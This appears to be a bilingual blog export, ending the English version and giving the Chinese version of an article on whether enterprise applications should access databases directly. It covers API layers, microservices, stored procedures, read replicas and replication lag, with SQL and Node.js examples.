tickets) warehouse.load(&#39;customer_360&#39;, customer_360) ✅ Historical analysis: Long-term trends (years of data) Year-over-year comparisons Seasonal patterns Retention cohorts ✅ Data transformation needs: Denormalization for performance Business logic calculations Data quality fixes Aggregations and rollups ✅ Compliance/audit: Immutable historical records Point-in-time snapshots Audit trails Regulatory reporting Hybrid Approach: Many enterprises use both: Real-time needs → Read Replica - Live dashboards - Operational reports - Current metrics Analytical needs → Data Warehouse - Historical analysis - Complex queries - Multi-source reports Example Architecture: flowchart TD Prod[(\"🗄️ Production DB\")] Prod -.->|\"Real-timeReplication\"| Replica[(\"📖 Read Replica\")] Prod -->|\"NightlyETL\"| DW[(\"📊 Data Warehouse\")] Replica --> LiveDash[\"⚡ Live Dashboard\"] DW --> Analytics[\"📈 Analytics Platform\"] DW --> BI[\"📊 BI Tools\"] style Prod fill:#e3f2fd style Replica fill:#fff3e0 style DW fill:#e8f5e9 Migration Path: Phase 1: Start with Read Replica Production DB → Read Replica → Analytics - Quick to set up - Immediate value - Low complexity Phase 2: Add ETL as Needs Grow Production DB → Read Replica → Real-time dashboards ↓ ETL → Data Warehouse → Complex analytics - Keep real-time for operational needs - Add warehouse for analytical needs - Best of both worlds Cost Comparison: Read Replica: Database replica: $200&#x2F;month Setup time: 1 day Maintenance: Low Total first year: ~$2,400 Data Warehouse + ETL: Warehouse: $500&#x2F;month ETL tool: $300&#x2F;month Setup time: 2-4 weeks Maintenance: Medium-High Total first year: ~$9,600 + setup costs Decision Framework: Start with Read Replica if: - Need real-time data - Single data source - Simple queries - Small budget - Quick wins needed Move to Data Warehouse when: - Need historical analysis (&gt;1 year) - Multiple data sources - Complex transformations - Slow queries on replica - Compliance requirements Database Views for Schema Abstraction Scenario: Need direct access but want to hide schema complexity. -- Create simplified view CREATE VIEW customer_summary AS SELECT c.id, c.name, c.email_address AS email, -- Hide column rename COUNT(o.id) AS order_count, SUM(o.total) AS total_spent FROM customers c LEFT JOIN orders o ON c.id &#x3D; o.customer_id GROUP BY c.id; -- Grant access to view only GRANT SELECT ON customer_summary TO &#39;reporting_app&#39;@&#39;%&#39;; Benefits: Schema changes hidden Simplified data model Pre-joined data Access control Decision Framework Choose Direct Access When: ✅ Small scale: &lt; 5 applications &lt; 1000 users Low traffic ✅ Internal only: No external access Trusted environment Single team ✅ Read-only: Analytics tools Reporting dashboards Data science ✅ Prototyping: MVP phase Proof of concept Time-critical demo Choose API Layer When: ✅ Enterprise scale: 5+ applications 1000+ users High traffic ✅ External access: Mobile apps Third-party integrations Public APIs ✅ Security critical: Customer data Financial information Healthcare records ✅ Long-term product: Production system Multiple teams Frequent changes Best Practices If You Must Use Direct Access 1. Use Read Replicas: Write apps → API → Primary DB Read apps → Read Replica 2. Create Database Users Per App: CREATE USER &#39;mobile_app&#39;@&#39;%&#39; IDENTIFIED BY &#39;password1&#39;; CREATE USER &#39;web_app&#39;@&#39;%&#39; IDENTIFIED BY &#39;password2&#39;; CREATE USER &#39;analytics&#39;@&#39;%&#39; IDENTIFIED BY &#39;password3&#39;; 3. Grant Minimal Permissions: -- Mobile app - only needs users and orders GRANT SELECT ON database.users TO &#39;mobile_app&#39;@&#39;%&#39;; GRANT SELECT ON database.orders TO &#39;mobile_app&#39;@&#39;%&#39;; -- Analytics - read-only everything GRANT SELECT ON database.* TO &#39;analytics&#39;@&#39;%&#39;; 4. Use Connection Pooling: &#x2F;&#x2F; Limit connections per app const pool &#x3D; mysql.createPool(&#123; host: &#39;database.example.com&#39;, user: &#39;mobile_app&#39;, password: process.env.DB_PASSWORD, database: &#39;production&#39;, connectionLimit: 5 &#x2F;&#x2F; Limit per app &#125;); 5. Monitor Everything: -- Enable query logging SET GLOBAL general_log &#x3D; &#39;ON&#39;; SET GLOBAL log_output &#x3D; &#39;TABLE&#39;; -- Review slow queries SELECT * FROM mysql.slow_log WHERE user_host LIKE &#39;%mobile_app%&#39;; Conclusion Direct database access is tempting—it’s simple and fast. But in enterprise environments, the risks usually outweigh the benefits. Key Takeaways: Direct access works for small, internal, read-only scenarios API layer provides security, flexibility, and control Tight coupling is the biggest long-term cost Start with API layer for production systems Migrate gradually if you have legacy direct access The Real Question: It’s not “Can we connect directly?” but “Should we?” For most enterprises, the answer is: Build the API layer. Your future self will thank you when you need to: Change the database schema Add a new application Revoke access for a compromised app Scale to handle more traffic Debug a production issue The upfront investment in an API layer pays dividends in security, maintainability, and scalability. 🏗️ Resources The Twelve-Factor App: Modern app architecture principles API Security Best Practices: OWASP API Security Database Connection Pooling: Performance optimization Microservices Patterns: Database per service pattern","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"},{"name":"Enterprise","slug":"Enterprise","permalink":"https://neo01.com/tags/Enterprise/"},{"name":"Security","slug":"Security","permalink":"https://neo01.com/tags/Security/"},{"name":"Database","slug":"Database","permalink":"https://neo01.com/tags/Database/"}],"lang":"en"},{"title":"企业中数据库是否应允许应用程序直接连接？","slug":"2023/01/Database-Direct-Access-zh-CN","date":"un55fin55","updated":"un00fin00","comments":false,"path":"/zh-CN/2023/01/Database-Direct-Access/","permalink":"https://neo01.com/zh-CN/2023/01/Database-Direct-Access/","excerpt":"多个应用程序直接连接到你的数据库——方便还是灾难？探索为什么企业架构师会争论这个基本设计决策。","text":"你的 CRM 需要客户数据。你的分析仪表板需要相同的数据。你的移动应用程序也需要它。数据库拥有一切。为什么不让它们全部直接连接？ 这似乎合乎逻辑。但在企业架构中，这个简单的决定可能会成就或破坏你系统的可扩展性、安全性和可维护性。 问题 在企业环境中，多个应用程序是否应该直接连接到数据库？ 简短回答：视情况而定——但通常不应该。 详细回答：让我们探讨两方面。 支持直接数据库访问的理由 优势 1. 简单性 flowchart LR App1[\"📱 移动应用程序\"] --> DB[(\"🗄️ 数据库\")] App2[\"💻 Web 应用程序\"] --> DB App3[\"📊 分析\"] --> DB style DB fill:#e3f2fd 更少的移动部件 无需维护中间件 直接的开发 快速原型制作 2. 性能 直接连接消除了中间层： 直接：应用程序 → 数据库（1 跳） API 层：应用程序 → API → 数据库（2 跳） 更低的延迟 更少的网络调用 无序列化开销 3. 实时数据 应用程序总是看到最新的数据： 无缓存失效问题 无同步延迟 立即一致性 4. 开发速度 开发人员可以： 查询他们需要的确切内容 快速迭代 直接使用数据库功能（存储过程、触发器） 何时有意义 小型组织： 2-3 个应用程序 单一开发团队 低流量 预算紧张 内部工具： 管理仪表板 报表工具 数据分析脚本 一次性工具 原型： MVP 开发 概念验证 快速实验 反对直接数据库访问的理由 问题 1. 安全噩梦 **问题：**每个应用程序都需要数据库凭证。 flowchart TD subgraph \"安全风险\" App1[\"📱 移动应用程序(代码中的数据库凭证)\"] App2[\"💻 Web 应用程序(配置中的数据库凭证)\"] App3[\"📊 分析(暴露的数据库凭证)\"] App4[\"🔧 管理工具(完整数据库访问)\"] end App1 --> DB[(\"🗄️ 数据库⚠️ 单点妥协\")] App2 --> DB App3 --> DB App4 --> DB style DB fill:#ffebee 风险： **凭证扩散：**多个代码库中的密码 **移动应用程序：**可以从 APK/IPA 提取凭证 **第三方访问：**难以撤销特定应用程序访问 **审计噩梦：**无法追踪哪个应用程序进行了哪个查询 真实世界示例： 移动应用程序反编译 → 提取数据库密码 → 攻击者拥有完整数据库访问权限 → 所有客户数据被泄露 2. 紧密耦合 **问题：**应用程序直接依赖数据库架构。 架构变更影响： -- 重新命名列 ALTER TABLE users RENAME COLUMN email TO email_address; 结果： ❌ 移动应用程序中断 ❌ Web 应用程序中断 ❌ 分析中断 ❌ 管理工具中断 ❌ 所有都需要同时更新 部署噩梦： 数据库迁移 → 必须同时部署所有应用程序 → 需要协调停机时间 → 失败风险高 3. 无业务逻辑层 **问题：**业务规则分散在各个应用程序中。 示例：折扣计算 移动应用程序：10% 折扣逻辑 Web 应用程序：15% 折扣逻辑（过时） 分析：无折扣逻辑（错误报表） 后果： 不一致的行为 重复的代码 难以维护 难以审计 存储过程如何？ 有些人认为：「将业务逻辑放在存储过程中——问题解决！」 存储过程方法： -- 数据库中的集中式折扣逻辑 CREATE PROCEDURE calculate_order_total( IN user_id INT, IN order_id INT, OUT final_total DECIMAL(10,2) ) BEGIN DECLARE base_total DECIMAL(10,2); DECLARE discount DECIMAL(10,2); DECLARE is_premium BOOLEAN; SELECT total INTO base_total FROM orders WHERE id &#x3D; order_id; SELECT premium INTO is_premium FROM users WHERE id &#x3D; user_id; IF is_premium THEN SET discount &#x3D; base_total * 0.15; ELSEIF base_total &gt; 100 THEN SET discount &#x3D; base_total * 0.10; ELSE SET discount &#x3D; 0; END IF; SET final_total &#x3D; base_total - discount; END; 优势： ✅ 逻辑集中在一个地方 ✅ 所有应用程序使用相同的计算 ✅ 保证一致的行为 ✅ 性能（在数据附近执行） 但严重的缺点： 1. 有限的语言功能： -- SQL&#x2F;PL-SQL 不是为复杂逻辑设计的 -- 没有现代语言功能： -- - 无依赖注入 -- - 有限的错误处理 -- - 无单元测试框架 -- - 无 IDE 支持（与 Java&#x2F;Python&#x2F;Node.js 相比） 2. 难以测试： &#x2F;&#x2F; 应用程序代码 - 易于测试 function calculateDiscount(user, order) &#123; if (user.isPremium) return order.total * 0.15; return order.total &gt; 100 ? order.total * 0.10 : 0; &#125; &#x2F;&#x2F; 单元测试 test(&#39;premium user gets 15% discount&#39;, () &#x3D;&gt; &#123; const user &#x3D; &#123; isPremium: true &#125;; const order &#x3D; &#123; total: 100 &#125;; expect(calculateDiscount(user, order)).toBe(15); &#125;); -- 存储过程 - 难以测试 -- 需要数据库连接 -- 需要测试数据设置 -- 测试执行缓慢 -- 无模拟&#x2F;存根 3. 供应商锁定： Oracle PL&#x2F;SQL ≠ SQL Server T-SQL ≠ PostgreSQL PL&#x2F;pgSQL -- 迁移数据库意味着重写所有过程 -- 不同的语法、功能、限制 4. 部署复杂性： 应用程序部署： - Git 提交 → CI&#x2F;CD → 部署 → 回滚容易 存储过程部署： - 手动 SQL 脚本 - 版本控制困难 - 回滚有风险 - 无法与应用程序代码原子部署 5. 有限的可观察性： &#x2F;&#x2F; 应用程序代码 - 完整的可观察性 function processOrder(order) &#123; logger.info(&#39;Processing order&#39;, &#123; orderId: order.id &#125;); const discount &#x3D; calculateDiscount(order); logger.debug(&#39;Discount calculated&#39;, &#123; discount &#125;); metrics.increment(&#39;orders.processed&#39;); return applyDiscount(order, discount); &#125; -- 存储过程 - 有限的可观察性 -- 难以添加日志 -- 难以添加指标 -- 难以追踪执行 -- 难以在生产环境中调试 6. 团队技能： 大多数开发人员知道：JavaScript、Python、Java、Go 较少开发人员知道：PL&#x2F;SQL、T-SQL、PL&#x2F;pgSQL → 更难招聘 → 更难维护 → 知识孤岛 何时存储过程有意义： ✅ 数据密集型操作： -- 批量数据处理 CREATE PROCEDURE archive_old_orders() BEGIN INSERT INTO orders_archive SELECT * FROM orders WHERE created_at &lt; DATE_SUB(NOW(), INTERVAL 1 YEAR); DELETE FROM orders WHERE created_at &lt; DATE_SUB(NOW(), INTERVAL 1 YEAR); END; ✅ 性能关键查询： -- 复杂聚合在数据库中更好 CREATE PROCEDURE get_sales_report(IN start_date DATE, IN end_date DATE) BEGIN SELECT DATE(created_at) as date, COUNT(*) as order_count, SUM(total) as revenue, AVG(total) as avg_order_value FROM orders WHERE created_at BETWEEN start_date AND end_date GROUP BY DATE(created_at); END; ✅ 遗留系统： 已经大量投资于存储过程 迁移成本太高 团队在数据库编程方面的专业知识 现代替代方案：精简存储过程 -- 存储过程仅用于数据访问 CREATE PROCEDURE get_user_orders(IN user_id INT) BEGIN SELECT * FROM orders WHERE user_id &#x3D; user_id; END; &#x2F;&#x2F; 应用程序中的业务逻辑 class OrderService &#123; async calculateTotal(userId, orderId) &#123; const orders &#x3D; await db.call(&#39;get_user_orders&#39;, [userId]); const user &#x3D; await db.call(&#39;get_user&#39;, [userId]); &#x2F;&#x2F; 业务逻辑在这里 - 可测试、可维护 const discount &#x3D; this.calculateDiscount(user, orders); return this.applyDiscount(orders, discount); &#125; &#125; 存储过程的结论： 存储过程可以集中逻辑，但它们： ❌ 不能解决直接访问问题 ❌ 创造新的维护挑战 ❌ 限制技术选择 ⚠️ 应谨慎用于数据密集型操作 ✅ 更好：将业务逻辑保留在应用程序层 4. 性能瓶颈 **问题：**数据库变得不堪重负。 连接限制： PostgreSQL 默认：100 个连接 MySQL 默认：151 个连接 10 个应用程序 × 每个 20 个连接 &#x3D; 200 个连接 → 数据库拒绝新连接 → 应用程序崩溃 查询混乱： 应用程序 1：SELECT * FROM orders（全表扫描） 应用程序 2：跨 5 个表的复杂 JOIN 应用程序 3：未优化的查询（缺少索引） → 数据库 CPU 达到 100% → 所有应用程序变慢 5. 无访问控制 **问题：**应用程序拥有太多访问权限。 典型设置： -- 所有应用程序使用相同的用户 GRANT ALL PRIVILEGES ON database.* TO &#39;app_user&#39;@&#39;%&#39;; 风险： 分析工具可以删除数据 移动应用程序可以删除表 无最小权限原则 意外数据丢失 6. 难以监控 **问题：**无法追踪应用程序行为。 你无法回答的问题： 哪个应用程序导致慢查询？ 哪个应用程序发出最多请求？ 哪个应用程序访问了敏感数据？ 哪个应用程序导致了中断？ 企业解决方案：API 层 架构模式 在数据库前放置 API 层有两种主要模式： 模式 1：单体 API 层 flowchart TD subgraph Apps[\"应用程序\"] App1[\"📱 移动应用程序\"] App2[\"💻 Web 应用程序\"] App3[\"📊 分析\"] end subgraph API[\"API 层\"] Auth[\"🔐 身份验证\"] BL[\"⚙️ 业务逻辑\"] Cache[\"💾 缓存\"] RateLimit[\"🚦 速率限制\"] end Apps --> Auth Auth --> BL BL --> Cache Cache --> DB[(\"🗄️ 数据库\")] style API fill:#e8f5e9 style DB fill:#e3f2fd 特征： 单一 API 服务 一个数据库（或共享数据库） 集中式业务逻辑 简单开始 模式 2：微服务（每服务一个数据库） flowchart TD subgraph Apps[\"应用程序\"] App1[\"📱 移动应用程序\"] App2[\"💻 Web 应用程序\"] end subgraph Gateway[\"API 网关\"] GW[\"🚪 网关(路由)\"] end subgraph Services[\"微服务\"] UserSvc[\"👤 用户服务\"] OrderSvc[\"📦 订单服务\"] ProductSvc[\"🏷️ 产品服务\"] end subgraph Databases[\"数据库\"] UserDB[(\"👤 用户数据库\")] OrderDB[(\"📦 订单数据库\")] ProductDB[(\"🏷️ 产品数据库\")] end Apps --> GW GW --> UserSvc GW --> OrderSvc GW --> ProductSvc UserSvc --> UserDB OrderSvc --> OrderDB ProductSvc --> ProductDB style Gateway fill:#fff3e0 style Services fill:#e8f5e9 style Databases fill:#e3f2fd 特征： 多个独立服务 每个服务拥有自己的数据库 分散式业务逻辑 复杂但可扩展 微服务模式：深入探讨 核心原则：每服务一个数据库 ❌ 反模式：共享数据库 用户服务 ──┐ ├──&gt; 共享数据库 订单服务 ──┘ 问题： - 通过架构紧密耦合 - 无法独立部署 - 架构变更破坏多个服务 ✅ 模式：每服务一个数据库 用户服务 ──&gt; 用户数据库 订单服务 ──&gt; 订单数据库 优势： - 松散耦合 - 独立部署 - 技术多样性 示例实现： 用户服务： &#x2F;&#x2F; user-service&#x2F;api.js const express &#x3D; require(&#39;express&#39;); const app &#x3D; express(); &#x2F;&#x2F; 用户服务拥有用户数据库 const userDB &#x3D; require(&#39;.&#x2F;db&#x2F;user-db&#39;); app.get(&#39;&#x2F;api&#x2F;users&#x2F;:id&#39;, async (req, res) &#x3D;&gt; &#123; const user &#x3D; await userDB.findById(req.params.id); res.json(user); &#125;); app.post(&#39;&#x2F;api&#x2F;users&#39;, async (req, res) &#x3D;&gt; &#123; const user &#x3D; await userDB.create(req.body); res.json(user); &#125;); app.listen(3001); 订单服务： &#x2F;&#x2F; order-service&#x2F;api.js const express &#x3D; require(&#39;express&#39;); const app &#x3D; express(); &#x2F;&#x2F; 订单服务拥有订单数据库 const orderDB &#x3D; require(&#39;.&#x2F;db&#x2F;order-db&#39;); app.get(&#39;&#x2F;api&#x2F;orders&#x2F;:id&#39;, async (req, res) &#x3D;&gt; &#123; const order &#x3D; await orderDB.findById(req.params.id); &#x2F;&#x2F; 需要用户数据？调用用户服务 API const user &#x3D; await fetch(&#96;http:&#x2F;&#x2F;user-service:3001&#x2F;api&#x2F;users&#x2F;$&#123;order.userId&#125;&#96;); res.json(&#123; ...order, user: await user.json() &#125;); &#125;); app.post(&#39;&#x2F;api&#x2F;orders&#39;, async (req, res) &#x3D;&gt; &#123; const order &#x3D; await orderDB.create(req.body); res.json(order); &#125;); app.listen(3002); API 网关： &#x2F;&#x2F; api-gateway&#x2F;gateway.js const express &#x3D; require(&#39;express&#39;); const &#123; createProxyMiddleware &#125; &#x3D; require(&#39;http-proxy-middleware&#39;); const app &#x3D; express(); &#x2F;&#x2F; 路由到适当的服务 app.use(&#39;&#x2F;api&#x2F;users&#39;, createProxyMiddleware(&#123; target: &#39;http:&#x2F;&#x2F;user-service:3001&#39;, changeOrigin: true &#125;)); app.use(&#39;&#x2F;api&#x2F;orders&#39;, createProxyMiddleware(&#123; target: &#39;http:&#x2F;&#x2F;order-service:3002&#39;, changeOrigin: true &#125;)); app.use(&#39;&#x2F;api&#x2F;products&#39;, createProxyMiddleware(&#123; target: &#39;http:&#x2F;&#x2F;product-service:3003&#39;, changeOrigin: true &#125;)); app.listen(8080); 微服务模式的优势： 1. 独立扩展： 用户服务：2 个实例（低流量） 订单服务：10 个实例（高流量） 产品服务：3 个实例（中等流量） 每个根据自己的需求扩展 2. 技术多样性： &#x2F;&#x2F; 用户服务 - Node.js + PostgreSQL const &#123; Pool &#125; &#x3D; require(&#39;pg&#39;); const pool &#x3D; new Pool(&#123; database: &#39;users&#39; &#125;); # 订单服务 - Python + MongoDB from pymongo import MongoClient client &#x3D; MongoClient(&#39;mongodb:&#x2F;&#x2F;localhost:27017&#x2F;&#39;) db &#x3D; client[&#39;orders&#39;] &#x2F;&#x2F; 产品服务 - Java + MySQL DataSource ds &#x3D; new MysqlDataSource(); ds.setURL(&quot;jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;products&quot;); 3. 独立部署： 部署用户服务 v2.0 → 只有用户服务重启 → 订单服务继续运行 → 产品服务继续运行 → 无需协调部署 4. 故障隔离： 订单服务崩溃 → 用户仍可登录（用户服务） → 用户可浏览产品（产品服务） → 只有订购功能中断 → 部分系统可用性 微服务模式的挑战： 1. 数据一致性： **问题：**无分布式事务 &#x2F;&#x2F; ❌ 无法跨服务执行此操作 BEGIN TRANSACTION; INSERT INTO users (id, name) VALUES (1, &#39;Alice&#39;); INSERT INTO orders (user_id, total) VALUES (1, 100); COMMIT; &#x2F;&#x2F; 用户服务和订单服务有独立的数据库 解决方案：Saga 模式 &#x2F;&#x2F; 基于编排的 saga class OrderService &#123; async createOrder(userId, items) &#123; &#x2F;&#x2F; 步骤 1：创建订单 const order &#x3D; await orderDB.create(&#123; userId, items, status: &#39;pending&#39; &#125;); &#x2F;&#x2F; 步骤 2：发布事件 await eventBus.publish(&#39;OrderCreated&#39;, &#123; orderId: order.id, userId, items &#125;); return order; &#125; &#x2F;&#x2F; 监听来自其他服务的事件 async onPaymentFailed(event) &#123; &#x2F;&#x2F; 补偿事务 await orderDB.update(event.orderId, &#123; status: &#39;cancelled&#39; &#125;); &#125; &#125; class PaymentService &#123; async onOrderCreated(event) &#123; try &#123; await this.chargeCustomer(event.userId, event.total); await eventBus.publish(&#39;PaymentSucceeded&#39;, &#123; orderId: event.orderId &#125;); &#125; catch (error) &#123; await eventBus.publish(&#39;PaymentFailed&#39;, &#123; orderId: event.orderId &#125;); &#125; &#125; &#125; 2. 数据重复： **问题：**服务需要来自其他服务的数据 &#x2F;&#x2F; 订单服务需要用户电子邮件进行通知 &#x2F;&#x2F; 但用户服务拥有用户数据 &#x2F;&#x2F; ❌ 不好：每次订单都查询用户服务 const order &#x3D; await orderDB.findById(orderId); const user &#x3D; await fetch(&#96;http:&#x2F;&#x2F;user-service&#x2F;api&#x2F;users&#x2F;$&#123;order.userId&#125;&#96;); await sendEmail(user.email, order); &#x2F;&#x2F; 慢，创造耦合 &#x2F;&#x2F; ✅ 好：在订单服务中缓存用户数据 const order &#x3D; await orderDB.findById(orderId); const userCache &#x3D; await orderDB.getUserCache(order.userId); await sendEmail(userCache.email, order); &#x2F;&#x2F; 快，但数据可能过时 解决方案：事件驱动的数据复制 &#x2F;&#x2F; 用户服务发布事件 class UserService &#123; async updateUser(userId, data) &#123; await userDB.update(userId, data); &#x2F;&#x2F; 发布事件 await eventBus.publish(&#39;UserUpdated&#39;, &#123; userId, email: data.email, name: data.name &#125;); &#125; &#125; &#x2F;&#x2F; 订单服务监听并缓存 class OrderService &#123; async onUserUpdated(event) &#123; &#x2F;&#x2F; 更新本地缓存 await orderDB.updateUserCache(event.userId, &#123; email: event.email, name: event.name &#125;); &#125; &#125; 3. 分布式查询： **问题：**无法跨服务 JOIN -- ❌ 无法使用微服务执行此操作 SELECT u.name, o.total, p.name as product_name FROM users u JOIN orders o ON u.id &#x3D; o.user_id JOIN products p ON o.product_id &#x3D; p.id; 解决方案：API 组合或 CQRS &#x2F;&#x2F; API 组合：在 API 网关中聚合 app.get(&#39;&#x2F;api&#x2F;order-details&#x2F;:orderId&#39;, async (req, res) &#x3D;&gt; &#123; &#x2F;&#x2F; 调用多个服务 const [order, user, product] &#x3D; await Promise.all([ fetch(&#96;http:&#x2F;&#x2F;order-service&#x2F;api&#x2F;orders&#x2F;$&#123;req.params.orderId&#125;&#96;), fetch(&#96;http:&#x2F;&#x2F;user-service&#x2F;api&#x2F;users&#x2F;$&#123;order.userId&#125;&#96;), fetch(&#96;http:&#x2F;&#x2F;product-service&#x2F;api&#x2F;products&#x2F;$&#123;order.productId&#125;&#96;) ]); &#x2F;&#x2F; 组合结果 res.json(&#123; order: await order.json(), user: await user.json(), product: await product.json() &#125;); &#125;); &#x2F;&#x2F; CQRS：独立的读取模型 class OrderReadModel &#123; &#x2F;&#x2F; 查询的非规范化视图 async getOrderDetails(orderId) &#123; &#x2F;&#x2F; 读取数据库中的预先连接数据 return await readDB.query(&#96; SELECT * FROM order_details_view WHERE order_id &#x3D; ? &#96;, [orderId]); &#125; &#x2F;&#x2F; 由所有服务的事件更新 async onOrderCreated(event) &#123; &#x2F;* 更新视图 *&#x2F; &#125; async onUserUpdated(event) &#123; &#x2F;* 更新视图 *&#x2F; &#125; async onProductUpdated(event) &#123; &#x2F;* 更新视图 *&#x2F; &#125; &#125; 何时使用微服务模式： ✅ 大型组织： 多个团队（5+ 团队） 每个团队拥有一个服务 独立发布周期 ✅ 不同的扩展需求： 某些功能高流量 某些功能低流量 需要独立扩展 ✅ 技术多样性： 不同的语言/框架 不同的数据库类型 遗留系统集成 ✅ 领域复杂性： 清晰的界限上下文 明确定义的服务边界 成熟的领域理解 何时不使用微服务： ❌ 小团队： &lt; 5 个开发人员 开销太高 单体更简单 ❌ 不清楚的边界： 领域理解不足 服务经常变更 大量跨服务调用 ❌ 简单应用程序： CRUD 操作 无复杂工作流程 单体就足够 ❌ 初创公司/MVP： 需要快速行动 需求经常变更 过早优化 迁移路径：单体到微服务 阶段 1：带模块的单体 单体 API ├── 用户模块 ├── 订单模块 └── 产品模块 ↓ 单一数据库 阶段 2：提取第一个服务 单体 API ──&gt; 共享数据库 ↓ 用户服务 ──&gt; 用户数据库（新） 阶段 3：提取更多服务 产品服务 ──&gt; 产品数据库 订单服务 ──&gt; 订单数据库 用户服务 ──&gt; 用户数据库 阶段 4：淘汰单体 API 网关 ├── 产品服务 ──&gt; 产品数据库 ├── 订单服务 ──&gt; 订单数据库 └── 用户服务 ──&gt; 用户数据库 最佳实践： 从单体开始 当痛点出现时提取服务 使用 API 网关进行路由 实现服务发现 使用事件驱动通信 监控一切 自动化部署 为故障设计 单体 API 层的优势 1. 安全性 集中式身份验证： 移动应用程序 → API（JWT 令牌） Web 应用程序 → API（OAuth） 分析 → API（API 密钥） API → 数据库（单一安全连接） 优势： 应用程序中无数据库凭证 撤销每个应用程序的访问 审计所有数据访问 实现速率限制 示例： &#x2F;&#x2F; 移动应用程序 - 无数据库凭证 const response &#x3D; await fetch(&#39;https:&#x2F;&#x2F;api.example.com&#x2F;users&#39;, &#123; headers: &#123; &#39;Authorization&#39;: &#39;Bearer &#39; + token &#125; &#125;); 2. 松散耦合 架构独立性： -- 数据库变更 ALTER TABLE users RENAME COLUMN email TO email_address; API 保持不变： GET &#x2F;api&#x2F;users&#x2F;123 &#123; &quot;email&quot;: &quot;user@example.com&quot; &#x2F;&#x2F; API 契约不变 &#125; 结果： ✅ 移动应用程序运作 ✅ Web 应用程序运作 ✅ 分析运作 ✅ 只有 API 代码更新 3. 业务逻辑集中化 单一真相来源： &#x2F;&#x2F; API 层 - 折扣逻辑在一个地方 function calculateDiscount(user, order) &#123; if (user.isPremium) return order.total * 0.15; if (order.total &gt; 100) return order.total * 0.10; return 0; &#125; 优势： 所有应用程序的一致行为 易于更新规则 单一测试位置 审计轨迹 4. 性能优化 连接池： 10 个应用程序 → API（10 个连接） API → 数据库（5 个池化连接） 而不是：10 个应用程序 × 20 &#x3D; 200 个连接 缓存： &#x2F;&#x2F; 缓存频繁查询 app.get(&#39;&#x2F;api&#x2F;products&#39;, async (req, res) &#x3D;&gt; &#123; const cached &#x3D; await redis.get(&#39;products&#39;); if (cached) return res.json(cached); const products &#x3D; await db.query(&#39;SELECT * FROM products&#39;); await redis.set(&#39;products&#39;, products, &#39;EX&#39;, 300); return res.json(products); &#125;); 优势： 减少数据库负载 更快的响应时间 更好的资源利用 5. 细粒度访问控制 每个应用程序的权限： &#x2F;&#x2F; 移动应用程序 - 只读 if (app &#x3D;&#x3D;&#x3D; &#39;mobile&#39;) &#123; allowedOperations &#x3D; [&#39;READ&#39;]; &#125; &#x2F;&#x2F; 管理工具 - 完整访问 if (app &#x3D;&#x3D;&#x3D; &#39;admin&#39; &amp;&amp; user.isAdmin) &#123; allowedOperations &#x3D; [&#39;READ&#39;, &#39;WRITE&#39;, &#39;DELETE&#39;]; &#125; &#x2F;&#x2F; 分析 - 仅特定表 if (app &#x3D;&#x3D;&#x3D; &#39;analytics&#39;) &#123; allowedTables &#x3D; [&#39;orders&#39;, &#39;products&#39;]; &#125; 6. 全面监控 追踪一切： &#x2F;&#x2F; 记录所有 API 请求 app.use((req, res, next) &#x3D;&gt; &#123; logger.info(&#123; app: req.headers[&#39;x-app-name&#39;], user: req.user.id, endpoint: req.path, method: req.method, duration: Date.now() - req.startTime &#125;); &#125;); 洞察： 哪个应用程序最慢？ 哪些端点最常使用？ 哪个应用程序导致错误？ 每个应用程序的使用模式 混合方法：何时混合使用 只读直接访问 **情境：**分析和报表工具需要复杂查询。 flowchart LR subgraph Write[\"写入操作\"] App1[\"📱 移动应用程序\"] App2[\"💻 Web 应用程序\"] end subgraph Read[\"只读\"] Analytics[\"📊 分析\"] Reports[\"📈 报表\"] end Write --> API[\"🔐 API 层\"] API --> DB[(\"🗄️ 主数据库\")] DB -.->|复制| ReadDB[(\"📖 读取副本\")] Read --> ReadDB style API fill:#e8f5e9 style DB fill:#e3f2fd style ReadDB fill:#fff3e0 设置： -- 分析的只读用户 CREATE USER &#39;analytics&#39;@&#39;%&#39; IDENTIFIED BY &#39;secure_password&#39;; GRANT SELECT ON database.* TO &#39;analytics&#39;@&#39;%&#39;; -- 连接到读取副本 -- 对生产数据库无影响 优势： 分析不会拖慢生产环境 允许复杂查询 无写入访问风险 独立监控 读取副本 vs ETL：如何选择？ 对于分析工作负载，你有两个主要选项： 选项 1：读取副本（实时） flowchart LR Prod[(\"🗄️ 生产数据库\")] -.->|\"持续复制\"| Replica[(\"📖 读取副本\")] Analytics[\"📊 分析工具\"] --> Replica style Prod fill:#e3f2fd style Replica fill:#fff3e0 -- 分析查询在副本上执行 SELECT DATE(created_at) as date, COUNT(*) as orders, SUM(total) as revenue FROM orders WHERE created_at &gt;&#x3D; DATE_SUB(NOW(), INTERVAL 30 DAY) GROUP BY DATE(created_at); 特征： ⚡ 实时或近实时数据（秒级延迟） 🔄 持续复制 📊 与生产环境相同的架构 🎯 直接 SQL 查询 ⚠️「近实时」现实检查**读取副本并非真正实时。**总是存在复制延迟。 典型复制延迟： **最佳情况：**100ms - 1 秒 **正常：**1-5 秒 **负载下：**10-60 秒 **网络问题：**数分钟或更长 这意味着什么： 12:00:00.000 - 客户在生产环境下订单 12:00:00.500 - 复制延迟（500ms） 12:00:00.500 - 订单出现在读取副本 12:00:00.600 - 分析仪表板查询副本 结果：仪表板在订单发生后 600ms 显示 **真实世界情境：** -- 生产环境：刚创建订单 INSERT INTO orders (id, status) VALUES (12345, &#39;pending&#39;); -- 读取副本：2 秒后 SELECT * FROM orders WHERE id &#x3D; 12345; -- 返回：无结果（复制延迟） -- 副本上 2 秒后 SELECT * FROM orders WHERE id &#x3D; 12345; -- 返回：找到订单 **复制延迟何时造成问题：** 1. **客户看到过时数据：** 用户：「我刚下了订单！」 仪表板：「找不到订单」 用户：「你的系统坏了！」 2. **不一致的视图：** 移动应用程序（生产）：100 个订单 仪表板（副本）：98 个订单（落后 2 秒） 3. **基于旧数据的业务决策：** 经理：「我们只有 5 件库存」 现实：0 件（最后 3 秒卖出 5 件） 经理：「来做促销！」 结果：超卖 **监控复制延迟：** -- PostgreSQL SELECT client_addr, state, sync_state, replay_lag, write_lag, flush_lag FROM pg_stat_replication; -- MySQL SHOW SLAVE STATUS\\G -- 查看：Seconds_Behind_Master **高延迟警报：** # Prometheus 警报 - alert: HighReplicationLag expr: mysql_slave_lag_seconds &gt; 10 for: 2m annotations: summary: &quot;复制延迟为 &#123;&#123; $value &#125;&#125; 秒&quot; 